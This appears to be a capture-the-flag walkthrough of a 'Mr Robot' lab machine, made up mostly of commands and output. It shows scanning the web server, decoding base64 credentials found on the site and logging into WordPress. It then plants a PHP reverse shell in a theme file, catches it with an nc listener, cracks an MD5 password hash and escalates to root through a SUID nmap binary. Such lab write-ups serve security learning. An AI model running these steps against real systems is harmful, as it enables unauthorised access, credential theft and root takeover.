# Mr Robot

## Key 1

    nmap -sC -sV 10.10.245.29                     
    Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 01:51 GMT
    Nmap scan report for 10.10.245.29
    Host is up (0.055s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE  VERSION
    22/tcp  closed ssh
    80/tcp  open   http     Apache httpd
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Apache
    443/tcp open   ssl/http Apache httpd
    | ssl-cert: Subject: commonName=www.example.com
    | Not valid before: 2015-09-16T10:45:03
    |_Not valid after:  2025-09-13T10:45:03
    |_http-server-header: Apache
    |_http-title: Site doesn't have a title (text/html).
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 40.68 seconds

    curl -s http://10.10.245.29/robots.txt
    User-agent: *
    fsocity.dic
    key-1-of-3.txt

    curl -s http://10.10.245.29/key-1-of-3.txt
    key1

## Key 2

`fsocity.dic` appears to be a dictionary with usernames and passwords.

### Nikto

    nikto -h 10.10.245.29

```text
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.245.29
  + Target Hostname:    10.10.245.29
  + Target Port:        80
  + Start Time:         2022-12-15 02:07:17 (GMT0)
---------------------------------------------------------------------------
    + Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
  + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
  + Retrieved x-powered-by header: PHP/5.5.29
  + No CGI Directories found (use '-C all' to force check all possible dirs)
  + Uncommon header 'tcn' found, with contents: list
  + Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
  + OSVDB-3092: /admin/: This might be interesting...
  + OSVDB-3092: /readme: This might be interesting...
  + Uncommon header 'link' found, with contents: <http://10.10.245.29/?p=23>; rel=shortlink
  + /wp-links-opml.php: This WordPress script reveals the installed version.
  + OSVDB-3092: /license.txt: License file found may identify site software.
  + /admin/index.html: Admin login page/section found.
  + Cookie wordpress_test_cookie created without the httponly flag
  + /wp-login/: Admin login page/section found.
  + /wordpress: A Wordpress installation was found.
  + /wp-admin/wp-login.php: Wordpress login found
  + /wordpresswp-admin/wp-login.php: Wordpress login found
  + /blog/wp-login.php: Wordpress login found
  + /wp-login.php: Wordpress login found
  + /wordpresswp-login.php: Wordpress login found
  + 7889 requests: 0 error(s) and 19 item(s) reported on remote host
  + End Time:           2022-12-15 02:20:20 (GMT0) (783 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Gobuster

    gobuster dir -u http://10.10.245.29 -w /usr/share/wordlists/dirb/common.txt -o directories.txt

```text
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.245.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/15 02:29:45 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.245.29/0/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.245.29/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/atom/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.245.29/audio/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.245.29/blog/]
/css                  (Status: 301) [Size: 232] [--> http://10.10.245.29/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.245.29/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/]
/images               (Status: 301) [Size: 235] [--> http://10.10.245.29/images/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.245.29/Image/]
/image                (Status: 301) [Size: 0] [--> http://10.10.245.29/image/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.245.29/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 231] [--> http://10.10.245.29/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.245.29/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.245.29/]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/rdf/]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 234] [--> http://10.10.245.29/video/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.245.29/wp-admin/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.245.29/wp-content/]
/wp-config            (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.245.29/wp-includes/]
/wp-cron              (Status: 200) [Size: 0]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-mail              (Status: 500) [Size: 3064]
/wp-login             (Status: 200) [Size: 2664]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.245.29/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
2022/12/15 02:37:48 Finished
===============================================================

```

O, hey, a `wp-login`. And `OSVDB-3092: /license.txt: License file found may identify site software.`

### dialogue

    curl -s http://10.10.245.29/license | tr -d "\n"

    blabla ZWxsaW90OkVSMjgtMDY1Mgo=

    echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
    elliot:ER28-0652

Login with the credentials: `http://10.10.245.29/wp-login`

Replacing the `404.php` with the [monkeytest reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).

And open a listener on the Kali machine.

    nc -nlvp 1234        
    Ncat: Version 7.93 ( https://nmap.org/ncat )
    Ncat: Listening on :::1234
    Ncat: Listening on 0.0.0.0:1234
    Ncat: Connection from 10.10.245.29.
    Ncat: Connection from 10.10.245.29:49295.
    Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
     02:57:09 up  1:06,  0 users,  load average: 0.00, 0.10, 0.74
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=1(daemon) gid=1(daemon) groups=1(daemon)
    /bin/sh: 0: can't access tty; job control turned off
    $ cd /home/robot
    $ ls
    key-2-of-3.txt
    password.raw-md5
    $ cat key-2-of-3.txt
    cat: key-2-of-3.txt: Permission denied
    $ cat password.raw-md5
    robot:c3fcd3d76192e4007dfb496cca67e13b

Look up the [md5](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b). 

And `su - robot`. Oh! `su: must be run from a terminal`.

    $ which python
    /usr/bin/python
    $ python -c 'import pty; pty.spawn("/bin/sh")'

Now `su`:

    $ su - robot
    su - robot
    Password: abcdefghijklmnopqrstuvwxyz
    $ whoami
    whoami
    robot
    $ cat key-2-of-3.txt
    cat key-2-of-3.txt

## Key 3

    $ find / -user root -perm -4000 -print 2>/dev/null
    find / -user root -perm -4000 -print 2>/dev/null
    /bin/ping
    /bin/umount
    /bin/mount
    /bin/ping6
    /bin/su
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/sudo
    /usr/local/bin/nmap
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
    /usr/lib/pt_chown
    $ nmap --interactive
    nmap --interactive
    
    Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
    Welcome to Interactive Mode -- press h <enter> for help
    nmap> !ls /root
    !ls /root
    firstboot_done	key-3-of-3.txt
    waiting to reap child : No child processes
    nmap> !cat /root/key-3-of-3.txt
    !cat /root/key-3-of-3.txt

